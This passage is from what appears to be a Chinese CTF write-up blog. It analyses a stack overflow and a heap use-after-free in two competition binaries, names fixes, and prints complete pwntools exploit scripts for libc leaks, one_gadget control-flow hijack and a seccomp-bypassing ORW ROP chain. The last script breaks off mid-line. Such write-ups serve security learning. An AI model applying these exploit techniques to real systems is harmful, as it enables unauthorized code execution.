punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-4h] BYREF</span>  <span class="token function">init_0</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">banner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">></span> <span class="token number">2</span> <span class="token operator">||</span> choice <span class="token operator">&amp;&amp;</span> choice <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Decrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>decrypt</code>函数中可以输入可控长度的内容，这里存在栈溢出漏洞，修复的话将这里读的长度控制成一个固定值就可以避免溢出了</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>  len <span class="token operator">=</span> length<span class="token punctuation">;</span>  result <span class="token operator">=</span> length<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>length <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x60uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Data: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序一开始将<code>data</code>地址赋给了<code>res</code>，最终的输出也是输出<code>res</code>地址中的内容，而溢出也可以控制<code>res</code>，所以劫持了<code>res</code>中的值就可以输出指定地址的内容，如果没有控制<code>res</code>那<code>res</code>本身就是一个栈地址</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">99</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-70h] BYREF</span>  <span class="token keyword">char</span> chr<span class="token punctuation">;</span> <span class="token comment">// [rsp+63h] [rbp-Dh]</span>  <span class="token keyword">int</span> len<span class="token punctuation">;</span> <span class="token comment">// [rsp+64h] [rbp-Ch]</span>  <span class="token keyword">char</span> <span class="token operator">*</span>res<span class="token punctuation">;</span> <span class="token comment">// [rsp+68h] [rbp-8h]</span>  <span class="token function">init_1</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>string<span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4060<span class="token punctuation">,</span> qword_4010<span class="token punctuation">)</span><span class="token punctuation">;</span>  res <span class="token operator">=</span> data<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据这点，因为输出是根据地址中有内容就输出并且指向下一个地址，可以先将<code>res</code>前面的空间填充掉让<code>while</code>循环到<code>res</code>这个地址来输出<code>res</code>，也就是一个栈上的地址，寻找栈上存在<code>libc</code>的地址，替换掉<code>res</code>就可以输出<code>libc</code>中的地址，最后通过栈溢出控制程序流执行<code>ogg</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice: '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Length: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Data: '</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'\x11'</span> <span class="token operator">*</span> <span class="token number">0x60</span> <span class="token operator">+</span> <span class="token string">b'\xff'</span> <span class="token operator">*</span> <span class="token number">0x8</span>add<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'ff ff ff ff ff ff ff ff '</span><span class="token punctuation">)</span>stack <span class="token operator">=</span>  u64<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b' '</span><span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> <span class="token string">b'\x11'</span> <span class="token operator">*</span> <span class="token number">0x60</span> <span class="token operator">+</span> <span class="token string">b'\xff'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Result in hex: '</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span>  u64<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b' '</span><span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x24083</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span>ogg <span class="token operator">=</span> <span class="token number">0xe3b01</span> <span class="token operator">+</span> libc_basepay <span class="token operator">=</span> <span class="token string">b'\x11'</span> <span class="token operator">*</span> <span class="token number">0x60</span> <span class="token operator">+</span> <span class="token string">b'\xff'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span>add<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice: '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Length: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Data: '</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'\x11'</span> <span class="token operator">*</span> <span class="token number">0x60</span> <span class="token operator">+</span> <span class="token string">b'\xff'</span> <span class="token operator">*</span> <span class="token number">0x8</span>add<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'ff ff ff ff ff ff ff ff '</span><span class="token punctuation">)</span>stack <span class="token operator">=</span>  u64<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b' '</span><span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> <span class="token string">b'\x11'</span> <span class="token operator">*</span> <span class="token number">0x60</span> <span class="token operator">+</span> <span class="token string">b'\xff'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Result in hex: '</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span>  u64<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b' '</span><span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x24083</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span>ogg <span class="token operator">=</span> <span class="token number">0xe3b01</span> <span class="token operator">+</span> libc_basepay <span class="token operator">=</span> <span class="token string">b'\x11'</span> <span class="token operator">*</span> <span class="token number">0x60</span> <span class="token operator">+</span> <span class="token string">b'\xff'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span>add<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="camera"><a href="#camera" class="headerlink" title="camera"></a>camera</h2><p>最后一题是一道<code>2.31</code>的堆题，先检查保护，沙箱</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">  camera  checksec pwn<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/game_2023/xiangshanbeijuesai/camera/camera/pwn'</span>    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled☁  camera  seccomp-tools dump ./pwn line  CODE  JT   JF      K<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> 0000: 0x20 0x00 0x00 0x00000004  A <span class="token operator">=</span> arch 0001: 0x15 0x00 0x02 0xc000003e  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> ARCH_X86_64<span class="token punctuation">)</span> goto 0004 0002: 0x20 0x00 0x00 0x00000000  A <span class="token operator">=</span> sys_number 0003: 0x15 0x00 0x01 0x0000003b  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> execve<span class="token punctuation">)</span> goto 0005 0004: 0x06 0x00 0x00 0x00000000  <span class="token builtin class-name">return</span> KILL 0005: 0x06 0x00 0x00 0x7fff0000  <span class="token builtin class-name">return</span> ALLOW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>存在三个功能，<code>add</code>里将申请的堆地址存入<code>heap_ptr</code>并将<code>flag</code>位置<code>1</code>，<code>load</code>将<code>heap_ptr</code>存入<code>selecetd_ptr</code>，并且将指向上一个堆地址的地址存入<code>last_ptr</code>，将<code>flag</code>位置<code>2</code>，<code>bss</code>段的三个变量整体可以看作一个结构体，分别是<code>heap_ptr</code>、<code>last_ptr</code>、<code>flag</code>，<code>show_delete</code>函数<code>show</code>出内容之后<code>delete</code>掉堆并且将<code>flag</code>位置<code>0</code>，漏洞出在没有将<code>last_ptr</code>置<code>0</code>，所以修复就可以将这个地址置<code>0</code>，而在修复前这里就存在<code>uaf</code>漏洞，所以可以利用这个<code>uaf</code>进行<code>fastbin</code>的<code>double free</code>，最后进行堆上的<code>orw</code>（回头系统学习一下…复现照抄了</p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'please input your choise'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Please select a film of your preference within your budget.'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Content:'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_delete</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'please input your choise'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Do you want to take a few pictures?'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">load</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'please input your choise'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'whitch one do you want to load'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>load<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show_delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>load<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show_delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1ecb61</span>libc <span class="token operator">=</span>  ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span>free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basesetcontext <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setcontext'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basemagic_gadget <span class="token operator">=</span> <span class="token number">0x0000000000151990</span> <span class="token operator">+</span> libc_basepop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000023b6a</span> <span class="token operator">+</span> libc_basepop_rsi_ret <span class="token operator">=</span> <span class="token number">0x000000000002601f</span> <span class="token operator">+</span> libc_basepop_rdx_ret <span class="token operator">=</span> <span class="token number">0x0000000000142c92</span> <span class="token operator">+</span> libc_basepop_rax_ret <span class="token operator">=</span> <span class="token number">0x0000000000036174</span> <span class="token operator">+</span> libc_basepop_rdx_r12_ret <span class="token operator">=</span> <span class="token number">0x0000000000119211</span> <span class="token operator">+</span> libc_baseret <span class="token operator">=</span> <span class="token number">0x0000000000022679</span> <span class="token operator">+</span> libc_basesyscall_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x10</span>add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>load<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>load<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>load<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    load<span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">)</span>show_delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>load<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>show_delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'The film content: '</span><span class="token punctuation">)</span>heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span 